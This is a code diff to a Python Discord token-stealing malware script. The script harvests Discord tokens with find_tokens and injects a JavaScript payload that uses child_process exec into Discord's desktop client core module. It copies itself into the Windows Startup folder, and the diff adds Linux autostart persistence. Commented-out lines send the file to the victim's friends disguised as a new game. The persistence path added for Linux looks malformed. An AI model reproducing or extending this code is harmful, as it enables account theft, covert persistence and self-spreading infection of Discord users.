@@ -77,7 +77,7 @@ if system == "Linux":
     if os.path.isdir(path1):
         find_tokens(str(path1))
 
-def even_more_persistance():
+def even_more_persistance_windows():
     jspath = roaming + "\\discord\\0.0.309\\modules\\discord_desktop_core\\index.js"
     payload = """module.exports = require('./core.asar');
     const { exec } = require("child_process");
@@ -104,9 +104,13 @@ bot = commands.Bot(command_prefix=prefix, self_bot=True)
 
 @bot.event
 async def on_ready():
-    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
-    shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\" + base)
-    even_more_persistance()
+    if system == "Windows":
+        shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + base)
+        shutil.copy(__file__, "C:\\Users\\"+ user + "\\AppData\\" + base)
+        even_more_persistance_windows()
+    if system == "Linux":
+        shutil.copy(__file__, home + ".config\\autostart" + base)
+
     #for friend in bot.user.friends:
         #await friend.send("Ayo try this new game!")
         #await friend.send(file=discord.File(__file__))
